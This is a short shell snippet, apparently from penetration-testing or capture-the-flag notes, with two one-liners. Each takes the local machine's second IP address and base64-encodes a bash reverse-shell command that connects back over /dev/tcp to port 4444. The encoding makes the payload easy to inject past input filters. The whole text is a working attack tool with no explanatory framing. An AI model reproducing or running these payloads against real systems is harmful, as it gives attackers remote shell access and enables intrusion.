tun0=$(hostname -I | cut -d " " -f2);echo "/bin/bash -i &> /dev/tcp/$tun0/4444 0>&1" | base64 |tr -d '\n'

tun0=$(hostname -I | cut -d " " -f2);echo "/bin/bash -c '/bin/bash -i &> /dev/tcp/$tun0/4444 0>&1'" | base64 |tr -d '\n'
